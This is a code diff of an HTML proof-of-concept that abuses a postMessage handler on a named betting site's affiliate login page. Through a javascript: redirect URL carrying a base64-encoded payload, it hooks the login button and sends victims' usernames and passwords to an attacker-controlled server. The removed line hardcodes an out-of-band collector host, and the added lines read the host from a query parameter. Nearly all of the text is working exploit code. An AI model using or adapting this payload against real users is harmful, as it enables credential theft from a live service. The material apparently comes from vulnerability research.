@@ -6,9 +6,27 @@
     <title>Postmessage PoC</title>
     <script>
       let win = window.open("https://affiliates.fanduel.com/login.asp");
-      let msg =
-        '{\n    "action": "redirect",\n"redirectUrl":"javascript:eval(atob(`dmFyIGludGVydj0gc2V0SW50ZXJ2YWwoKCkgPT4gewogICAgICAgIAogICAgICAgIHZhciBidG4gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgic3VibWl0TG9jYWxMb2dpbiIpOwogICAgICAgIGlmKGJ0bil7CiAgICAgICAgICBjbGVhckludGVydmFsKGludGVydikKICAgICAgICAgIGJ0bi5vbmNsaWNrID0gKCkgPT4gewogICAgICAgICAgICB2YXIgdXNlck5hbWUgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgidXNlcm5hbWUiKS52YWx1ZTsKICAgICAgICAgICAgdmFyIHBhc3N3b3JkID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInBhc3N3b3JkIikudmFsdWU7CiAgICAgICAgICAgIGZldGNoKAogICAgICAgICAgICAgIGBodHRwczovL2NoaHE5Ym4ydnRjMDAwMGY4a3JnZ2VhNXdzZXl5eXl5Yi5vYXN0LmZ1bj92aWN0aW1Vc2VyTmFtZT0ke2VuY29kZVVSSUNvbXBvbmVudCgKICAgICAgICAgICAgICAgIHVzZXJOYW1lCiAgICAgICAgICAgICAgKX0mdmljdGltUGFzc3dvcmQ9JHtlbmNvZGVVUklDb21wb25lbnQocGFzc3dvcmQpfWAKICAgICAgICAgICAgKTsKICAgICAgICAgIH07CiAgICAgICAgfQogICAgICB9LDUwMCk=`))//"}';
-      msg = JSON.parse(msg);
+      let ATTACKER_SERVER = new URLSearchParams(location.search).get("ATTACKER_SERVER");
+      let payload=btoa(`var interv= setInterval(() => {
+        
+        var btn = document.getElementById("submitLocalLogin");
+        if(btn){
+          clearInterval(interv)
+          btn.onclick = () => {
+            var userName = document.getElementById("username").value;
+            var password = document.getElementById("password").value;
+            fetch(
+              \`${ATTACKER_SERVER}?victimUserName=${encodeURIComponent(
+                userName
+              )}&victimPassword=${encodeURIComponent(password)}\`
+            );
+          };
+        }
+      },500)`)
+
+      let msg ={action:"redirect",redirectUrl:`javascript:eval(atob(${payload}))//`}
+        //'{\n    "action": "redirect",\n"redirectUrl":`javascript:eval(atob(${}))//`}';
+      //msg = JSON.parse(msg);
       setTimeout(function () {
         win.postMessage(msg, "*");
       }, 7000);
